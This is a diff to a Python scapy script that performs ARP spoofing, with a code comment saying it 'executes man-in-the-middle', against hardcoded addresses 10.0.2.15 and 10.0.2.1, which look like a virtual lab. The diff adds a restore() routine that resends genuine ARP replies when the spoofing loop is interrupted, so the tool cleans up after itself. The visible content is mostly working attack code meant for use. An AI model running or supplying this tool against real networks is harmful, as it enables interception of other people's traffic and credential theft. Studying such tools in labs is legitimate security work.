@@ -21,6 +21,12 @@ def spoof(target_ip, spoof_ip):
 
     scapy.send(packet, verbose=False)
 
+def restore(dest_ip, src_ip):
+    dest_mac = get_mac(dest_ip)
+    src_mac = get_mac((src_ip))
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip,hwsrc=src_mac)
+    scapy.send(packet, verbose=False)
+
 
 def main(target_ip, spoof_ip):  # executes man-in-the-middle
     packet_counter = 0
@@ -35,5 +41,8 @@ def main(target_ip, spoof_ip):  # executes man-in-the-middle
             time.sleep(2)
     except KeyboardInterrupt:
         print("\n[+] Detected CTRL + C. Quitting.")
+        restore(target_ip,spoof_ip)
+        restore(spoof_ip,target_ip)
+        print("[+] restored ARP tables for " + target_ip + " and " + spoof_ip)
 
 main("10.0.2.15", "10.0.2.1")
